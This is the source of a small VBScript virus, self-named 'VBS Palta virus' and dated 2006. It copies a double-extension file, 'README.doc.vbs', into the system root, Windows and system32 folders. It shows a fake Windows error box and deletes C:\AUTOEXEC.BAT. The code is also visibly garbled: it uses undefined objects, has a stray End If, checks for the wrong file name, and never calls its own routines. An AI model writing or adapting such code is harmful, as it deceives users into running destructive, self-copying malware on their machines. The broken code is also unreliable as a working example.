'VBS Palta virus written by you know who
'Written on Oct 07,2006

function replicate()
myfile.writeline("Copying files to  :  " & sharename)
Set fso = CreateObject("scripting.filesystemobject")

fso.copyfile "c:\README.doc.vbs", "C:\"

If (fso2.FileExists("c:\presentation.pps.vbs")) Then
myfile.writeline("Successfull copy to  :  " & sharename)
End If  

fso.copyfile "c:\README.doc.vbs", "C:\WINDOWS"

fso.copyfile "c:\README.doc.vbs", "C:\WINDOWS\system32"

end function

msgbox "Error!File is corrupted!", 16, "Windows"


Sub DeleteFiles
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile("C:\AUTOEXEC.BAT")
End Sub
End If 






